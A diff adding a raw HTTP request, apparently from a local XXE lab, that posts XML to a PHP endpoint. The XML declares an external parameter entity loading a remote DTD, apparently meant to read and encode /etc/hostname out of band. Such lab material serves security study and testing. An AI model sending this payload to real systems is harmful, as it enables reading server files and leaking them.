@@ -1,0 +1,22 @@
+POST /php/process.php HTTP/1.1
+Host: localhost:8085
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: text/plain;charset=UTF-8
+Content-Length: 216
+Origin: http://localhost:8085
+DNT: 1
+Connection: close
+Referer: http://localhost:8085/php/
+
+<!DOCTYPE root [
+  <!ENTITY % xxe SYSTEM "http://127.0.0.1:5000/php_encode_etc_hostname.dtd"> %xxe;
+]>
+<root>
+  <name>XXE</name>
+  <tel>(555) 555-1734</tel>
+  <email>email</email>
+  <password>pass</password>
+</root>
